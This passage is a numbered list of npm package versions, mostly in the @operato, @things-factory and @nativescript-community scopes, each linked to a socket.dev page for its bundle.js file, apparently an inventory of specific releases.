097. [@nativescript-community/text@1.6.11](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.11/bundle.js)
098. [@nativescript-community/text@1.6.12](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.12/bundle.js)
099. [@nativescript-community/text@1.6.13](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.13/bundle.js)
100. [@nativescript-community/text@1.6.9](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.9/bundle.js)
101. [@nativescript-community/typeorm@0.2.30](https://socket.dev/npm/package/@nativescript-community/typeorm/files/0.2.30/bundle.js)
102. [@nativescript-community/typeorm@0.2.31](https://socket.dev/npm/package/@nativescript-community/typeorm/files/0.2.31/bundle.js)
103. [@nativescript-community/typeorm@0.2.32](https://socket.dev/npm/package/@nativescript-community/typeorm/files/0.2.32/bundle.js)
104. [@nativescript-community/typeorm@0.2.33](https://socket.dev/npm/package/@nativescript-community/typeorm/files/0.2.33/bundle.js)
105. [@nativescript-community/ui-collectionview@6.0.6](https://socket.dev/npm/package/@nativescript-community/ui-collectionview/files/6.0.6/bundle.js)
106. [@nativescript-community/ui-document-picker@1.1.27](https://socket.dev/npm/package/@nativescript-community/ui-document-picker/files/1.1.27/bundle.js)
107. [@nativescript-community/ui-document-picker@1.1.28](https://socket.dev/npm/package/@nativescript-community/ui-document-picker/files/1.1.28/bundle.js)
108. [@nativescript-community/ui-drawer@0.1.30](https://socket.dev/npm/package/@nativescript-community/ui-drawer/files/0.1.30/bundle.js)
109. [@nativescript-community/ui-image@4.5.6](https://socket.dev/npm/package/@nativescript-community/ui-image/files/4.5.6/bundle.js)
110. [@nativescript-community/ui-label@1.3.35](https://socket.dev/npm/package/@nativescript-community/ui-label/files/1.3.35/bundle.js)
111. [@nativescript-community/ui-label@1.3.36](https://socket.dev/npm/package/@nativescript-community/ui-label/files/1.3.36/bundle.js)
112. [@nativescript-community/ui-label@1.3.37](https://socket.dev/npm/package/@nativescript-community/ui-label/files/1.3.37/bundle.js)
113. [@nativescript-community/ui-material-bottom-navigation@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-bottom-navigation/files/7.2.72/bundle.js)
114. [@nativescript-community/ui-material-bottom-navigation@7.2.73](https://socket.dev/npm/package/@nativescript-community/ui-material-bottom-navigation/files/7.2.73/bundle.js)
115. [@nativescript-community/ui-material-bottom-navigation@7.2.74](https://socket.dev/npm/package/@nativescript-community/ui-material-bottom-navigation/files/7.2.74/bundle.js)
116. [@nativescript-community/ui-material-bottom-navigation@7.2.75](https://socket.dev/npm/package/@nativescript-community/ui-material-bottom-navigation/files/7.2.75/bundle.js)
117. [@nativescript-community/ui-material-bottomsheet@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-bottomsheet/files/7.2.72/bundle.js)
118. [@nativescript-community/ui-material-core-tabs@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.72/bundle.js)
119. [@nativescript-community/ui-material-core-tabs@7.2.73](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.73/bundle.js)
120. [@nativescript-community/ui-material-core-tabs@7.2.74](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.74/bundle.js)
121. [@nativescript-community/ui-material-core-tabs@7.2.75](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.75/bundle.js)
122. [@nativescript-community/ui-material-core-tabs@7.2.76](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.76/bundle.js)
123. [@nativescript-community/ui-material-core@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-core/files/7.2.72/bundle.js)
124. [@nativescript-community/ui-material-core@7.2.73](https://socket.dev/npm/package/@nativescript-community/ui-material-core/files/7.2.73/bundle.js)
125. [@nativescript-community/ui-material-core@7.2.74](https://socket.dev/npm/package/@nativescript-community/ui-material-core/files/7.2.74/bundle.js)
126. [@nativescript-community/ui-material-core@7.2.75](https://socket.dev/npm/package/@nativescript-community/ui-material-core/files/7.2.75/bundle.js)
127. [@nativescript-community/ui-material-core@7.2.76](https://socket.dev/npm/package/@nativescript-community/ui-material-core/files/7.2.76/bundle.js)
128. [@nativescript-community/ui-material-ripple@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-ripple/files/7.2.72/bundle.js)
129. [@nativescript-community/ui-material-ripple@7.2.73](https://socket.dev/npm/package/@nativescript-community/ui-material-ripple/files/7.2.73/bundle.js)
130. [@nativescript-community/ui-material-ripple@7.2.74](https://socket.dev/npm/package/@nativescript-community/ui-material-ripple/files/7.2.74/bundle.js)
131. [@nativescript-community/ui-material-ripple@7.2.75](https://socket.dev/npm/package/@nativescript-community/ui-material-ripple/files/7.2.75/bundle.js)
132. [@nativescript-community/ui-material-tabs@7.2.72](https://socket.dev/npm/package/@nativescript-community/ui-material-tabs/files/7.2.72/bundle.js)
133. [@nativescript-community/ui-material-tabs@7.2.73](https://socket.dev/npm/package/@nativescript-community/ui-material-tabs/files/7.2.73/bundle.js)
134. [@nativescript-community/ui-material-tabs@7.2.74](https://socket.dev/npm/package/@nativescript-community/ui-material-tabs/files/7.2.74/bundle.js)
135. [@nativescript-community/ui-material-tabs@7.2.75](https://socket.dev/npm/package/@nativescript-community/ui-material-tabs/files/7.2.75/bundle.js)
136. [@nativescript-community/ui-pager@14.1.36](https://socket.dev/npm/package/@nativescript-community/ui-pager/files/14.1.36/bundle.js)
137. [@nativescript-community/ui-pager@14.1.37](https://socket.dev/npm/package/@nativescript-community/ui-pager/files/14.1.37/bundle.js)
138. [@nativescript-community/ui-pager@14.1.38](https://socket.dev/npm/package/@nativescript-community/ui-pager/files/14.1.38/bundle.js)
139. [@nativescript-community/ui-pulltorefresh@2.5.4](https://socket.dev/npm/package/@nativescript-community/ui-pulltorefresh/files/2.5.4/bundle.js)
140. [@nativescript-community/ui-pulltorefresh@2.5.5](https://socket.dev/npm/package/@nativescript-community/ui-pulltorefresh/files/2.5.5/bundle.js)
141. [@nativescript-community/ui-pulltorefresh@2.5.6](https://socket.dev/npm/package/@nativescript-community/ui-pulltorefresh/files/2.5.6/bundle.js)
142. [@nativescript-community/ui-pulltorefresh@2.5.7](https://socket.dev/npm/package/@nativescript-community/ui-pulltorefresh/files/2.5.7/bundle.js)
143. [@nexe/config-manager@0.1.1](https://socket.dev/npm/package/@nexe/config-manager/files/0.1.1/bundle.js)
144. [@nexe/eslint-config@0.1.1](https://socket.dev/npm/package/@nexe/eslint-config/files/0.1.1/bundle.js)
145. [@nexe/logger@0.1.3](https://socket.dev/npm/package/@nexe/logger/files/0.1.3/bundle.js)
146. [@nstudio/angular@20.0.4](https://socket.dev/npm/package/@nstudio/angular/files/20.0.4/bundle.js)
147. [@nstudio/angular@20.0.5](https://socket.dev/npm/package/@nstudio/angular/files/20.0.5/bundle.js)
148. [@nstudio/angular@20.0.6](https://socket.dev/npm/package/@nstudio/angular/files/20.0.6/bundle.js)
149. [@nstudio/focus@20.0.4](https://socket.dev/npm/package/@nstudio/focus/files/20.0.4/bundle.js)
150. [@nstudio/focus@20.0.5](https://socket.dev/npm/package/@nstudio/focus/files/20.0.5/bundle.js)
151. [@nstudio/focus@20.0.6](https://socket.dev/npm/package/@nstudio/focus/files/20.0.6/bundle.js)
152. [@nstudio/nativescript-checkbox@2.0.6](https://socket.dev/npm/package/@nstudio/nativescript-checkbox/files/2.0.6/bundle.js)
153. [@nstudio/nativescript-checkbox@2.0.7](https://socket.dev/npm/package/@nstudio/nativescript-checkbox/files/2.0.7/bundle.js)
154. [@nstudio/nativescript-checkbox@2.0.8](https://socket.dev/npm/package/@nstudio/nativescript-checkbox/files/2.0.8/bundle.js)
155. [@nstudio/nativescript-checkbox@2.0.9](https://socket.dev/npm/package/@nstudio/nativescript-checkbox/files/2.0.9/bundle.js)
156. [@nstudio/nativescript-loading-indicator@5.0.1](https://socket.dev/npm/package/@nstudio/nativescript-loading-indicator/files/5.0.1/bundle.js)
157. [@nstudio/nativescript-loading-indicator@5.0.2](https://socket.dev/npm/package/@nstudio/nativescript-loading-indicator/files/5.0.2/bundle.js)
158. [@nstudio/nativescript-loading-indicator@5.0.3](https://socket.dev/npm/package/@nstudio/nativescript-loading-indicator/files/5.0.3/bundle.js)
159. [@nstudio/nativescript-loading-indicator@5.0.4](https://socket.dev/npm/package/@nstudio/nativescript-loading-indicator/files/5.0.4/bundle.js)
160. [@nstudio/ui-collectionview@5.1.11](https://socket.dev/npm/package/@nstudio/ui-collectionview/files/5.1.11/bundle.js)
161. [@nstudio/ui-collectionview@5.1.12](https://socket.dev/npm/package/@nstudio/ui-collectionview/files/5.1.12/bundle.js)
162. [@nstudio/ui-collectionview@5.1.13](https://socket.dev/npm/package/@nstudio/ui-collectionview/files/5.1.13/bundle.js)
163. [@nstudio/ui-collectionview@5.1.14](https://socket.dev/npm/package/@nstudio/ui-collectionview/files/5.1.14/bundle.js)
164. [@nstudio/web-angular@20.0.4](https://socket.dev/npm/package/@nstudio/web-angular/files/20.0.4/bundle.js)
165. [@nstudio/web@20.0.4](https://socket.dev/npm/package/@nstudio/web/files/20.0.4/bundle.js)
166. [@nstudio/xplat-utils@20.0.5](https://socket.dev/npm/package/@nstudio/xplat-utils/files/20.0.5/bundle.js)
167. [@nstudio/xplat-utils@20.0.6](https://socket.dev/npm/package/@nstudio/xplat-utils/files/20.0.6/bundle.js)
168. [@nstudio/xplat-utils@20.0.7](https://socket.dev/npm/package/@nstudio/xplat-utils/files/20.0.7/bundle.js)
169. [@nstudio/xplat@20.0.5](https://socket.dev/npm/package/@nstudio/xplat/files/20.0.5/bundle.js)
170. [@nstudio/xplat@20.0.6](https://socket.dev/npm/package/@nstudio/xplat/files/20.0.6/bundle.js)
171. [@nstudio/xplat@20.0.7](https://socket.dev/npm/package/@nstudio/xplat/files/20.0.7/bundle.js)
172. [@operato/board@9.0.35](https://socket.dev/npm/package/@operato/board/files/9.0.35/bundle.js)
173. [@operato/board@9.0.36](https://socket.dev/npm/package/@operato/board/files/9.0.36/bundle.js)
174. [@operato/board@9.0.37](https://socket.dev/npm/package/@operato/board/files/9.0.37/bundle.js)
175. [@operato/board@9.0.38](https://socket.dev/npm/package/@operato/board/files/9.0.38/bundle.js)
176. [@operato/board@9.0.39](https://socket.dev/npm/package/@operato/board/files/9.0.39/bundle.js)
177. [@operato/board@9.0.40](https://socket.dev/npm/package/@operato/board/files/9.0.40/bundle.js)
178. [@operato/board@9.0.41](https://socket.dev/npm/package/@operato/board/files/9.0.41/bundle.js)
179. [@operato/board@9.0.42](https://socket.dev/npm/package/@operato/board/files/9.0.42/bundle.js)
180. [@operato/board@9.0.43](https://socket.dev/npm/package/@operato/board/files/9.0.43/bundle.js)
181. [@operato/board@9.0.44](https://socket.dev/npm/package/@operato/board/files/9.0.44/bundle.js)
182. [@operato/board@9.0.45](https://socket.dev/npm/package/@operato/board/files/9.0.45/bundle.js)
183. [@operato/board@9.0.46](https://socket.dev/npm/package/@operato/board/files/9.0.46/bundle.js)
184. [@operato/board@9.0.47](https://socket.dev/npm/package/@operato/board/files/9.0.47/bundle.js)
185. [@operato/board@9.0.48](https://socket.dev/npm/package/@operato/board/files/9.0.48/bundle.js)
186. [@operato/board@9.0.49](https://socket.dev/npm/package/@operato/board/files/9.0.49/bundle.js)
187. [@operato/board@9.0.50](https://socket.dev/npm/package/@operato/board/files/9.0.50/bundle.js)
188. [@operato/board@9.0.51](https://socket.dev/npm/package/@operato/board/files/9.0.51/bundle.js)
189. [@operato/data-grist@9.0.29](https://socket.dev/npm/package/@operato/data-grist/files/9.0.29/bundle.js)
190. [@operato/data-grist@9.0.35](https://socket.dev/npm/package/@operato/data-grist/files/9.0.35/bundle.js)
191. [@operato/data-grist@9.0.36](https://socket.dev/npm/package/@operato/data-grist/files/9.0.36/bundle.js)
192. [@operato/data-grist@9.0.37](https://socket.dev/npm/package/@operato/data-grist/files/9.0.37/bundle.js)
193. [@operato/graphql@9.0.22](https://socket.dev/npm/package/@operato/graphql/files/9.0.22/bundle.js)
194. [@operato/graphql@9.0.35](https://socket.dev/npm/package/@operato/graphql/files/9.0.35/bundle.js)
195. [@operato/graphql@9.0.36](https://socket.dev/npm/package/@operato/graphql/files/9.0.36/bundle.js)
196. [@operato/graphql@9.0.37](https://socket.dev/npm/package/@operato/graphql/files/9.0.37/bundle.js)
197. [@operato/graphql@9.0.38](https://socket.dev/npm/package/@operato/graphql/files/9.0.38/bundle.js)
198. [@operato/graphql@9.0.39](https://socket.dev/npm/package/@operato/graphql/files/9.0.39/bundle.js)
199. [@operato/graphql@9.0.40](https://socket.dev/npm/package/@operato/graphql/files/9.0.40/bundle.js)
200. [@operato/graphql@9.0.41](https://socket.dev/npm/package/@operato/graphql/files/9.0.41/bundle.js)
201. [@operato/graphql@9.0.42](https://socket.dev/npm/package/@operato/graphql/files/9.0.42/bundle.js)
202. [@operato/graphql@9.0.43](https://socket.dev/npm/package/@operato/graphql/files/9.0.43/bundle.js)
203. [@operato/graphql@9.0.44](https://socket.dev/npm/package/@operato/graphql/files/9.0.44/bundle.js)
204. [@operato/graphql@9.0.45](https://socket.dev/npm/package/@operato/graphql/files/9.0.45/bundle.js)
205. [@operato/graphql@9.0.46](https://socket.dev/npm/package/@operato/graphql/files/9.0.46/bundle.js)
206. [@operato/graphql@9.0.47](https://socket.dev/npm/package/@operato/graphql/files/9.0.47/bundle.js)
207. [@operato/graphql@9.0.48](https://socket.dev/npm/package/@operato/graphql/files/9.0.48/bundle.js)
208. [@operato/graphql@9.0.49](https://socket.dev/npm/package/@operato/graphql/files/9.0.49/bundle.js)
209. [@operato/graphql@9.0.50](https://socket.dev/npm/package/@operato/graphql/files/9.0.50/bundle.js)
210. [@operato/graphql@9.0.51](https://socket.dev/npm/package/@operato/graphql/files/9.0.51/bundle.js)
211. [@operato/headroom@9.0.2](https://socket.dev/npm/package/@operato/headroom/files/9.0.2/bundle.js)
212. [@operato/headroom@9.0.35](https://socket.dev/npm/package/@operato/headroom/files/9.0.35/bundle.js)
213. [@operato/headroom@9.0.36](https://socket.dev/npm/package/@operato/headroom/files/9.0.36/bundle.js)
214. [@operato/headroom@9.0.37](https://socket.dev/npm/package/@operato/headroom/files/9.0.37/bundle.js)
215. [@operato/help@9.0.35](https://socket.dev/npm/package/@operato/help/files/9.0.35/bundle.js)
216. [@operato/help@9.0.36](https://socket.dev/npm/package/@operato/help/files/9.0.36/bundle.js)
217. [@operato/help@9.0.37](https://socket.dev/npm/package/@operato/help/files/9.0.37/bundle.js)
218. [@operato/help@9.0.38](https://socket.dev/npm/package/@operato/help/files/9.0.38/bundle.js)
219. [@operato/help@9.0.39](https://socket.dev/npm/package/@operato/help/files/9.0.39/bundle.js)
220. [@operato/help@9.0.40](https://socket.dev/npm/package/@operato/help/files/9.0.40/bundle.js)
221. [@operato/help@9.0.41](https://socket.dev/npm/package/@operato/help/files/9.0.41/bundle.js)
222. [@operato/help@9.0.42](https://socket.dev/npm/package/@operato/help/files/9.0.42/bundle.js)
223. [@operato/help@9.0.43](https://socket.dev/npm/package/@operato/help/files/9.0.43/bundle.js)
224. [@operato/help@9.0.44](https://socket.dev/npm/package/@operato/help/files/9.0.44/bundle.js)
225. [@operato/help@9.0.45](https://socket.dev/npm/package/@operato/help/files/9.0.45/bundle.js)
226. [@operato/help@9.0.46](https://socket.dev/npm/package/@operato/help/files/9.0.46/bundle.js)
227. [@operato/help@9.0.47](https://socket.dev/npm/package/@operato/help/files/9.0.47/bundle.js)
228. [@operato/help@9.0.48](https://socket.dev/npm/package/@operato/help/files/9.0.48/bundle.js)
229. [@operato/help@9.0.49](https://socket.dev/npm/package/@operato/help/files/9.0.49/bundle.js)
230. [@operato/help@9.0.50](https://socket.dev/npm/package/@operato/help/files/9.0.50/bundle.js)
231. [@operato/help@9.0.51](https://socket.dev/npm/package/@operato/help/files/9.0.51/bundle.js)
232. [@operato/i18n@9.0.35](https://socket.dev/npm/package/@operato/i18n/files/9.0.35/bundle.js)
233. [@operato/i18n@9.0.36](https://socket.dev/npm/package/@operato/i18n/files/9.0.36/bundle.js)
234. [@operato/i18n@9.0.37](https://socket.dev/npm/package/@operato/i18n/files/9.0.37/bundle.js)
235. [@operato/input@9.0.27](https://socket.dev/npm/package/@operato/input/files/9.0.27/bundle.js)
236. [@operato/input@9.0.35](https://socket.dev/npm/package/@operato/input/files/9.0.35/bundle.js)
237. [@operato/input@9.0.36](https://socket.dev/npm/package/@operato/input/files/9.0.36/bundle.js)
238. [@operato/input@9.0.37](https://socket.dev/npm/package/@operato/input/files/9.0.37/bundle.js)
239. [@operato/input@9.0.38](https://socket.dev/npm/package/@operato/input/files/9.0.38/bundle.js)
240. [@operato/input@9.0.39](https://socket.dev/npm/package/@operato/input/files/9.0.39/bundle.js)
241. [@operato/input@9.0.40](https://socket.dev/npm/package/@operato/input/files/9.0.40/bundle.js)
242. [@operato/input@9.0.41](https://socket.dev/npm/package/@operato/input/files/9.0.41/bundle.js)
243. [@operato/input@9.0.42](https://socket.dev/npm/package/@operato/input/files/9.0.42/bundle.js)
244. [@operato/input@9.0.43](https://socket.dev/npm/package/@operato/input/files/9.0.43/bundle.js)
245. [@operato/input@9.0.44](https://socket.dev/npm/package/@operato/input/files/9.0.44/bundle.js)
246. [@operato/input@9.0.45](https://socket.dev/npm/package/@operato/input/files/9.0.45/bundle.js)
247. [@operato/input@9.0.46](https://socket.dev/npm/package/@operato/input/files/9.0.46/bundle.js)
248. [@operato/input@9.0.47](https://socket.dev/npm/package/@operato/input/files/9.0.47/bundle.js)
249. [@operato/input@9.0.48](https://socket.dev/npm/package/@operato/input/files/9.0.48/bundle.js)
250. [@operato/layout@9.0.35](https://socket.dev/npm/package/@operato/layout/files/9.0.35/bundle.js)
251. [@operato/layout@9.0.36](https://socket.dev/npm/package/@operato/layout/files/9.0.36/bundle.js)
252. [@operato/layout@9.0.37](https://socket.dev/npm/package/@operato/layout/files/9.0.37/bundle.js)
253. [@operato/popup@9.0.22](https://socket.dev/npm/package/@operato/popup/files/9.0.22/bundle.js)
254. [@operato/popup@9.0.35](https://socket.dev/npm/package/@operato/popup/files/9.0.35/bundle.js)
255. [@operato/popup@9.0.36](https://socket.dev/npm/package/@operato/popup/files/9.0.36/bundle.js)
256. [@operato/popup@9.0.37](https://socket.dev/npm/package/@operato/popup/files/9.0.37/bundle.js)
257. [@operato/popup@9.0.38](https://socket.dev/npm/package/@operato/popup/files/9.0.38/bundle.js)
258. [@operato/popup@9.0.39](https://socket.dev/npm/package/@operato/popup/files/9.0.39/bundle.js)
259. [@operato/popup@9.0.40](https://socket.dev/npm/package/@operato/popup/files/9.0.40/bundle.js)
260. [@operato/popup@9.0.41](https://socket.dev/npm/package/@operato/popup/files/9.0.41/bundle.js)
261. [@operato/popup@9.0.42](https://socket.dev/npm/package/@operato/popup/files/9.0.42/bundle.js)
262. [@operato/popup@9.0.43](https://socket.dev/npm/package/@operato/popup/files/9.0.43/bundle.js)
263. [@operato/popup@9.0.44](https://socket.dev/npm/package/@operato/popup/files/9.0.44/bundle.js)
264. [@operato/popup@9.0.45](https://socket.dev/npm/package/@operato/popup/files/9.0.45/bundle.js)
265. [@operato/popup@9.0.46](https://socket.dev/npm/package/@operato/popup/files/9.0.46/bundle.js)
266. [@operato/popup@9.0.47](https://socket.dev/npm/package/@operato/popup/files/9.0.47/bundle.js)
267. [@operato/popup@9.0.48](https://socket.dev/npm/package/@operato/popup/files/9.0.48/bundle.js)
268. [@operato/popup@9.0.49](https://socket.dev/npm/package/@operato/popup/files/9.0.49/bundle.js)
269. [@operato/popup@9.0.50](https://socket.dev/npm/package/@operato/popup/files/9.0.50/bundle.js)
270. [@operato/popup@9.0.51](https://socket.dev/npm/package/@operato/popup/files/9.0.51/bundle.js)
271. [@operato/pull-to-refresh@9.0.35](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.35/bundle.js)
272. [@operato/pull-to-refresh@9.0.36](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.36/bundle.js)
273. [@operato/pull-to-refresh@9.0.37](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.37/bundle.js)
274. [@operato/pull-to-refresh@9.0.38](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.38/bundle.js)
275. [@operato/pull-to-refresh@9.0.39](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.39/bundle.js)
276. [@operato/pull-to-refresh@9.0.40](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.40/bundle.js)
277. [@operato/pull-to-refresh@9.0.41](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.41/bundle.js)
278. [@operato/pull-to-refresh@9.0.42](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.42/bundle.js)
279. [@operato/pull-to-refresh@9.0.43](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.43/bundle.js)
280. [@operato/pull-to-refresh@9.0.44](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.44/bundle.js)
281. [@operato/pull-to-refresh@9.0.45](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.45/bundle.js)
282. [@operato/pull-to-refresh@9.0.46](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.46/bundle.js)
283. [@operato/pull-to-refresh@9.0.47](https://socket.dev/npm/package/@operato/pull-to-refresh/files/9.0.47/bundle.js)
284. [@operato/shell@9.0.22](https://socket.dev/npm/package/@operato/shell/files/9.0.22/bundle.js)
285. [@operato/shell@9.0.35](https://socket.dev/npm/package/@operato/shell/files/9.0.35/bundle.js)
286. [@operato/shell@9.0.36](https://socket.dev/npm/package/@operato/shell/files/9.0.36/bundle.js)
287. [@operato/shell@9.0.37](https://socket.dev/npm/package/@operato/shell/files/9.0.37/bundle.js)
288. [@operato/shell@9.0.38](https://socket.dev/npm/package/@operato/shell/files/9.0.38/bundle.js)
289. [@operato/shell@9.0.39](https://socket.dev/npm/package/@operato/shell/files/9.0.39/bundle.js)
290. [@operato/styles@9.0.2](https://socket.dev/npm/package/@operato/styles/files/9.0.2/bundle.js)
291. [@operato/styles@9.0.35](https://socket.dev/npm/package/@operato/styles/files/9.0.35/bundle.js)
292. [@operato/styles@9.0.36](https://socket.dev/npm/package/@operato/styles/files/9.0.36/bundle.js)
293. [@operato/styles@9.0.37](https://socket.dev/npm/package/@operato/styles/files/9.0.37/bundle.js)
294. [@operato/utils@9.0.22](https://socket.dev/npm/package/@operato/utils/files/9.0.22/bundle.js)
295. [@operato/utils@9.0.35](https://socket.dev/npm/package/@operato/utils/files/9.0.35/bundle.js)
296. [@operato/utils@9.0.36](https://socket.dev/npm/package/@operato/utils/files/9.0.36/bundle.js)
297. [@operato/utils@9.0.37](https://socket.dev/npm/package/@operato/utils/files/9.0.37/bundle.js)
298. [@operato/utils@9.0.38](https://socket.dev/npm/package/@operato/utils/files/9.0.38/bundle.js)
299. [@operato/utils@9.0.39](https://socket.dev/npm/package/@operato/utils/files/9.0.39/bundle.js)
300. [@operato/utils@9.0.40](https://socket.dev/npm/package/@operato/utils/files/9.0.40/bundle.js)
301. [@operato/utils@9.0.41](https://socket.dev/npm/package/@operato/utils/files/9.0.41/bundle.js)
302. [@operato/utils@9.0.42](https://socket.dev/npm/package/@operato/utils/files/9.0.42/bundle.js)
303. [@operato/utils@9.0.43](https://socket.dev/npm/package/@operato/utils/files/9.0.43/bundle.js)
304. [@operato/utils@9.0.44](https://socket.dev/npm/package/@operato/utils/files/9.0.44/bundle.js)
305. [@operato/utils@9.0.45](https://socket.dev/npm/package/@operato/utils/files/9.0.45/bundle.js)
306. [@operato/utils@9.0.46](https://socket.dev/npm/package/@operato/utils/files/9.0.46/bundle.js)
307. [@operato/utils@9.0.47](https://socket.dev/npm/package/@operato/utils/files/9.0.47/bundle.js)
308. [@operato/utils@9.0.48](https://socket.dev/npm/package/@operato/utils/files/9.0.48/bundle.js)
309. [@operato/utils@9.0.49](https://socket.dev/npm/package/@operato/utils/files/9.0.49/bundle.js)
310. [@operato/utils@9.0.50](https://socket.dev/npm/package/@operato/utils/files/9.0.50/bundle.js)
311. [@operato/utils@9.0.51](https://socket.dev/npm/package/@operato/utils/files/9.0.51/bundle.js)
312. [@rxap/ngx-bootstrap@19.0.3](https://socket.dev/npm/package/@rxap/ngx-bootstrap/files/19.0.3/bundle.js)
313. [@rxap/ngx-bootstrap@19.0.4](https://socket.dev/npm/package/@rxap/ngx-bootstrap/files/19.0.4/bundle.js)
314. [@teriyakibomb/ember-velcro@2.2.1](https://socket.dev/npm/package/@teriyakibomb/ember-velcro/files/2.2.1/bundle.js)
315. [@teselagen/bio-parsers@0.4.30](https://socket.dev/npm/package/@teselagen/bio-parsers/files/0.4.30/bundle.js)
316. [@teselagen/bounce-loader@0.3.16](https://socket.dev/npm/package/@teselagen/bounce-loader/files/0.3.16/bundle.js)
317. [@teselagen/bounce-loader@0.3.17](https://socket.dev/npm/package/@teselagen/bounce-loader/files/0.3.17/bundle.js)
318. [@teselagen/file-utils@0.3.22](https://socket.dev/npm/package/@teselagen/file-utils/files/0.3.22/bundle.js)
319. [@teselagen/liquibase-tools@0.4.1](https://socket.dev/npm/package/@teselagen/liquibase-tools/files/0.4.1/bundle.js)
320. [@teselagen/ove@0.7.40](https://socket.dev/npm/package/@teselagen/ove/files/0.7.40/bundle.js)
321. [@teselagen/range-utils@0.3.14](https://socket.dev/npm/package/@teselagen/range-utils/files/0.3.14/bundle.js)
322. [@teselagen/range-utils@0.3.15](https://socket.dev/npm/package/@teselagen/range-utils/files/0.3.15/bundle.js)
323. [@teselagen/react-list@0.8.19](https://socket.dev/npm/package/@teselagen/react-list/files/0.8.19/bundle.js)
324. [@teselagen/react-list@0.8.20](https://socket.dev/npm/package/@teselagen/react-list/files/0.8.20/bundle.js)
325. [@teselagen/react-table@6.10.19](https://socket.dev/npm/package/@teselagen/react-table/files/6.10.19/bundle.js)
326. [@teselagen/react-table@6.10.20](https://socket.dev/npm/package/@teselagen/react-table/files/6.10.20/bundle.js)
327. [@teselagen/react-table@6.10.22](https://socket.dev/npm/package/@teselagen/react-table/files/6.10.22/bundle.js)
328. [@teselagen/sequence-utils@0.3.34](https://socket.dev/npm/package/@teselagen/sequence-utils/files/0.3.34/bundle.js)
329. [@teselagen/ui@0.9.10](https://socket.dev/npm/package/@teselagen/ui/files/0.9.10/bundle.js)
330. [@thangved/callback-window@1.1.4](https://socket.dev/npm/package/@thangved/callback-window/files/1.1.4/bundle.js)
331. [@things-factory/attachment-base@9.0.42](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.42/bundle.js)
332. [@things-factory/attachment-base@9.0.43](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.43/bundle.js)
333. [@things-factory/attachment-base@9.0.44](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.44/bundle.js)
334. [@things-factory/attachment-base@9.0.45](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.45/bundle.js)
335. [@things-factory/attachment-base@9.0.46](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.46/bundle.js)
336. [@things-factory/attachment-base@9.0.47](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.47/bundle.js)
337. [@things-factory/attachment-base@9.0.48](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.48/bundle.js)
338. [@things-factory/attachment-base@9.0.49](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.49/bundle.js)
339. [@things-factory/attachment-base@9.0.50](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.50/bundle.js)
340. [@things-factory/attachment-base@9.0.51](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.51/bundle.js)
341. [@things-factory/attachment-base@9.0.52](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.52/bundle.js)
342. [@things-factory/attachment-base@9.0.53](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.53/bundle.js)
343. [@things-factory/attachment-base@9.0.54](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.54/bundle.js)
344. [@things-factory/attachment-base@9.0.55](https://socket.dev/npm/package/@things-factory/attachment-base/files/9.0.55/bundle.js)
345. [@things-factory/auth-base@9.0.42](https://socket.dev/npm/package/@things-factory/auth-base/files/9.0.42/bundle.js)
346. [@things-factory/auth-base@9.0.43](https://socket.dev/npm/package/@things-factory/auth-base/files/9.0.43/bundle.js)
347. [@things-factory/auth-base@9.0.44](https://socket.dev/npm/package/@things-factory/auth-base/files/9.0.44/bundle.js)
348. [@things-factory/auth-base@9.0.45](https://socket.dev/npm/package/@things-factory/auth-base/files/9.0.45/bundle.js)
349. [@things-factory/email-base@9.0.42](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.42/bundle.js)
350. [@things-factory/email-base@9.0.43](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.43/bundle.js)
351. [@things-factory/email-base@9.0.44](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.44/bundle.js)
352. [@things-factory/email-base@9.0.45](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.45/bundle.js)
353. [@things-factory/email-base@9.0.46](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.46/bundle.js)
354. [@things-factory/email-base@9.0.47](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.47/bundle.js)
355. [@things-factory/email-base@9.0.48](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.48/bundle.js)
356. [@things-factory/email-base@9.0.49](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.49/bundle.js)
357. [@things-factory/email-base@9.0.50](https://socket.dev/npm/package/@things-factory/email-base/files/9.0.50/bundle.js)
